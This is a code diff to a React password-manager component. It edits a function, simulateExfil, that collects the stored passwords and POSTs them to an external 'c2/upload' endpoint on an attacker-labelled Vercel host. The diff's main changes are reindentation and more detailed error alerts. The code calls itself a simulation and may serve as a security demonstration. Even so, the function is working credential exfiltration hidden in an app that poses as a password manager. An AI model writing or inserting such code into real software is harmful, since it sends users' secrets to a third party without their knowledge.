@@ -69,34 +69,37 @@ export default function PasswordManager() {
     }));
   };
 
-  const simulateExfil = async () => {
-    if (passwords.length === 0) {
-      alert('No passwords to exfiltrate!');
-      return;
-    }
+const simulateExfil = async () => {
+  if (passwords.length === 0) {
+    alert('No passwords to exfiltrate!');
+    return;
+  }
 
-    const payload = {
-      simulation: true,
-      attacker_label: 'react-sim',
-      timestamp: new Date().toISOString(),
-      collected: buildPayload()
-    };
-
-    try {
-      const res = await fetch('https://attacker-sim-6cxj-p690zm6kz-loxy1235s-projects.vercel.app/c2/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      });
-      if (!res.ok) throw new Error(`Server responded ${res.status}`);
-      alert('Passwords sent successfully to simulated C2 server.');
-      setMessage('');
-    } catch (err) {
-      console.error('Exfiltration failed:', err);
-      alert('Failed to send passwords to simulated C2 server.');
-    }
+  const payload = {
+    simulation: true,
+    attacker_label: 'react-sim',
+    timestamp: new Date().toISOString(),
+    collected: buildPayload()
   };
 
+  try {
+    const res = await fetch('https://attacker-sim-6cxj-p690zm6kz-loxy1235s-projects.vercel.app/c2/upload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+    if (!res.ok) {
+      const text = await res.text();
+      console.error('Server error:', res.status, text);
+      alert(`Server error: ${res.status} - ${text}`);
+      return;
+    }
+    alert('Passwords sent successfully to simulated C2 server.');
+  } catch (err) {
+    console.error('Network or other error:', err);
+    alert('Failed to send passwords to simulated C2 server.');
+  }
+};
   if (loading) return <div>Loading passwords...</div>;
 
   if (!isUnlocked) {
